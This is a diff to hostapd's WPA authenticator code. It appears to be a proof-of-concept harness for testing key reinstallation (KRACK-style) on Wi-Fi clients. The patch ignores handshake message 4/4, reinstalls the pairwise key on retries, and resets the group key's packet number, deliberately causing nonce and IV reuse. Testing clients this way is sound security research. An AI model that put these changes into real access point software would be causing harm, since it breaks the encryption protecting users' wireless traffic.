@@ -5,6 +5,7 @@
  * This software may be distributed under the terms of the BSD license.
  * See README for more details.
  */
+#include <time.h>
 
 #include "utils/includes.h"
 
@@ -53,10 +54,10 @@ static void wpa_group_get(struct wpa_authenticator *wpa_auth,
 static void wpa_group_put(struct wpa_authenticator *wpa_auth,
 			  struct wpa_group *group);
 
-static const u32 dot11RSNAConfigGroupUpdateCount = 4;
-static const u32 dot11RSNAConfigPairwiseUpdateCount = 4;
-static const u32 eapol_key_timeout_first = 100; /* ms */
-static const u32 eapol_key_timeout_subseq = 1000; /* ms */
+static const u32 dot11RSNAConfigGroupUpdateCount = 4000;
+static const u32 dot11RSNAConfigPairwiseUpdateCount = 4000;
+static const u32 eapol_key_timeout_first = 2000; /* ms */
+static const u32 eapol_key_timeout_subseq = 2000; /* ms */
 static const u32 eapol_key_timeout_first_group = 500; /* ms */
 
 /* TODO: make these configurable */
@@ -163,6 +164,23 @@ static inline int wpa_auth_start_ampe(struct wpa_authenticator *wpa_auth,
 }
 #endif /* CONFIG_MESH */
 
+void poc_log(const u8 *clientmac, const char *format, ...)
+{
+	time_t rawtime;
+	struct tm *timeinfo;
+
+	va_list arg;
+	va_start(arg, format);
+
+	time(&rawtime);
+	timeinfo = localtime(&rawtime);
+	printf("[%02d:%02d:%02d] " MACSTR ": Hostapd: ", timeinfo->tm_hour,
+		timeinfo->tm_min, timeinfo->tm_sec, MAC2STR(clientmac));
+
+	vprintf(format, arg);
+
+	va_end(arg); 
+}
 
 int wpa_auth_for_each_sta(struct wpa_authenticator *wpa_auth,
 			  int (*cb)(struct wpa_state_machine *sm, void *ctx),
@@ -971,6 +989,15 @@ void wpa_receive(struct wpa_authenticator *wpa_auth,
 	} else if (key_data_length == 0) {
 		msg = PAIRWISE_4;
 		msgtxt = "4/4 Pairwise";
+
+		// Still mark connection as complete, so we do receive and accept encrypted data
+		if (sm->keycount <= 0) {
+			wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_authorized, 1);
+			sm->keycount = 1;
+		}
+
+		//poc_log(sm->addr, "Ignoring Msg4/4\n");
+		return;
 	} else {
 		msg = PAIRWISE_2;
 		msgtxt = "2/4 Pairwise";
@@ -2217,11 +2244,28 @@ SM_STATE(WPA_PTK, PTKINITNEGOTIATING)
 		return;
 	}
 
+	if (sm->TimeoutCtr > 1 && !sm->pairwise_set) {
+		poc_log(sm->addr, "already installing pairwise key\n");
+		enum wpa_alg alg = wpa_cipher_to_alg(sm->pairwise);
+		int klen = wpa_cipher_key_len(sm->pairwise);
+		if (wpa_auth_set_key(sm->wpa_auth, 0, alg, sm->addr, 0,
+				     sm->PTK.tk, klen)) {
+			wpa_sta_disconnect(sm->wpa_auth, sm->addr);
+			return;
+		}
+		sm->pairwise_set = TRUE;
+	}
+
+	// Reset transmit packet number of the group key, so we can detect if clients
+	// will accept re-used packet numbers (IVs) in broadcast data frames. Debug
+	// output is printed below.
+	wpa_group_config_group_keys(sm->wpa_auth, sm->group);
+
 	/* Send EAPOL(1, 1, 1, Pair, P, RSC, ANonce, MIC(PTK), RSNIE, [MDIE],
 	   GTK[GN], IGTK, [FTIE], [TIE * 2])
 	 */
 	os_memset(rsc, 0, WPA_KEY_RSC_LEN);
-	wpa_auth_get_seqnum(sm->wpa_auth, NULL, gsm->GN, rsc);
+	//wpa_auth_get_seqnum(sm->wpa_auth, NULL, gsm->GN, rsc);
 	/* If FT is used, wpa_auth->wpa_ie includes both RSNIE and MDIE */
 	wpa_ie = sm->wpa_auth->wpa_ie;
 	wpa_ie_len = sm->wpa_auth->wpa_ie_len;
@@ -2373,6 +2417,8 @@ SM_STATE(WPA_PTK, PTKINITNEGOTIATING)
 				  addr, sizeof(addr), NULL, 0);
 	}
 #endif /* CONFIG_P2P */
+
+	poc_log(sm->addr, "Resetting Tx IV of group key and sending Msg4/4\n");
 
 	wpa_send_eapol(sm->wpa_auth, sm,
 		       (secure ? WPA_KEY_INFO_SECURE : 0) | WPA_KEY_INFO_MIC |
